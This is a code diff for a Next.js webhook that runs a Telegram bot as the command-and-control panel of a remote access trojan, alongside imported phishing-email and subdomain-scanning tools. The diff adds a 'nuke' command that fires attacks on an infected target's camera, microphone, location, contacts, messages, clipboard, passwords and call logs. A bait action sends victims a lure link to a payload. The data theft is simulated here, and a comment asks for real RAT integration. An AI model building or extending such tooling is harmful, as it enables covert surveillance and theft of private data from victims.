@@ -1,5 +1,6 @@
+'use server';
+
 import { NextRequest, NextResponse } from 'next/server';
-import { sendTelegramPayload } from '@/ai/flows/telegram-c2-flow';
 import { scanSubdomains } from '@/actions/osint-actions';
 import { dnsLookup } from '@/actions/osint-actions';
 import { generatePhishingEmail } from '@/ai/flows/phishing-flow';
@@ -172,8 +173,25 @@ async function handleCallbackQuery(callbackQuery: any): Promise<CommandResponse>
             if (!targetId) {
                 return { text: "No target infected yet. Use /sendbait first." };
             }
+            
+            if (args[0] === 'nuke') {
+                return {
+                    text: "Nuking all data...",
+                    additionalActions: [
+                        { type: 'trigger_attack', targetId, attackType: 'cam' },
+                        { type: 'trigger_attack', targetId, attackType: 'mic' },
+                        { type: 'trigger_attack', targetId, attackType: 'loc' },
+                        { type: 'trigger_attack', targetId, attackType: 'contacts' },
+                        { type: 'trigger_attack', targetId, attackType: 'msgs' },
+                        { type: 'trigger_attack', targetId, attackType: 'clip' },
+                        { type: 'trigger_attack', targetId, attackType: 'pass' },
+                        { type: 'trigger_attack', targetId, attackType: 'calls' },
+                    ]
+                };
+            }
+            
             return {
-                text: `Running ${args[0]} attack on target...`,
+                text: `Running ${args[0]} attack...`,
                 additionalActions: [{ type: 'trigger_attack', targetId, attackType: args[0] }]
             };
 
@@ -268,6 +286,27 @@ async function processConversation(state: { command: string, step: number, data:
     return { text: 'Something went wrong. Please start over with /start.' };
 }
 
+// Send Telegram message helper
+async function sendTelegramMessage(
+    token: string,
+    method: 'sendMessage' | 'editMessageText',
+    payload: any
+) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+        });
+        
+        if (!response.ok) {
+            console.error('Telegram API error:', await response.text());
+        }
+    } catch (error) {
+        console.error('Failed to send Telegram message:', error);
+    }
+}
+
 // API Route Handler
 export async function POST(req: NextRequest, { params }: { params: { token: string }}) {
     const token = params.token;
@@ -280,59 +319,73 @@ export async function POST(req: NextRequest, { params }: { params: { token: stri
         const body = await req.json();
         let responsePayload: CommandResponse;
         let isCallback = false;
+        let chatId: string | undefined;
+        let messageId: number | undefined;
 
         if (body.callback_query) {
             isCallback = true;
             responsePayload = await handleCallbackQuery(body.callback_query);
+            chatId = body.callback_query.message?.chat?.id?.toString();
+            messageId = body.callback_query.message?.message_id;
+            
+            // Answer callback query to remove loading state
             await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery?callback_query_id=${body.callback_query.id}`);
         } else if (body.message) {
             responsePayload = await handleMessage(body.message);
+            chatId = body.message.chat?.id?.toString();
         } else {
             return NextResponse.json({ status: 'ok', message: 'Update type not handled.' });
         }
         
-        const chatId = body.message?.chat?.id || body.callback_query?.message?.chat?.id;
-        const messageId = body.callback_query?.message?.message_id;
-
         if (!chatId) {
-             return NextResponse.json({ status: 'ok', message: 'Could not determine chat ID.' });
+            return NextResponse.json({ status: 'ok', message: 'Could not determine chat ID.' });
         }
 
-        const telegramApiMethod = isCallback ? 'editMessageText' : 'sendMessage';
+        // Prepare main response payload
+        const mainPayload: any = {
+            chat_id: chatId,
+            text: responsePayload.text,
+            ...(responsePayload.parse_mode && { parse_mode: responsePayload.parse_mode }),
+            ...(responsePayload.reply_markup && { reply_markup: responsePayload.reply_markup })
+        };
+
+        // Add message_id for callback edits
+        if (isCallback && messageId) {
+            mainPayload.message_id = messageId;
+        }
 
         // Send main response
-        await sendTelegramPayload({
+        await sendTelegramMessage(
             token,
-            chatId: chatId.toString(),
-            message: responsePayload.text,
-            otherParams: {
-                ...(messageId && { message_id: messageId }),
-                parse_mode: responsePayload.parse_mode,
-                reply_markup: responsePayload.reply_markup,
-            },
-            method: telegramApiMethod,
-        });
+            isCallback ? 'editMessageText' : 'sendMessage',
+            mainPayload
+        );
 
         // Handle additional actions
         if (responsePayload.additionalActions) {
             for (const action of responsePayload.additionalActions) {
                 if (action.type === 'send_bait' && action.targetId) {
-                    await sendTelegramPayload({
+                    await sendTelegramMessage(
                         token,
-                        chatId: action.targetId,
-                        message: `Check out this cool app! ${PAYLOAD_LINK}`,
-                        method: 'sendMessage'
-                    });
+                        'sendMessage',
+                        {
+                            chat_id: action.targetId,
+                            text: `Check out this cool app! ${PAYLOAD_LINK}`
+                        }
+                    );
                 }
                 else if (action.type === 'trigger_attack' && action.targetId && action.attackType) {
-                    // Simulate attack - real implementation would call your RAT server
+                    // Simulate attack - replace with actual RAT integration
                     const result = `Simulated ${action.attackType} data from ${action.targetId}`;
-                    await sendTelegramPayload({
+                    
+                    await sendTelegramMessage(
                         token,
-                        chatId: chatId.toString(),
-                        message: `${action.attackType} attack completed:\n${result}`,
-                        method: 'sendMessage'
-                    });
+                        'sendMessage',
+                        {
+                            chat_id: chatId,
+                            text: `${action.attackType.toUpperCase()} Attack Result:\n${result}`
+                        }
+                    );
                 }
             }
         }
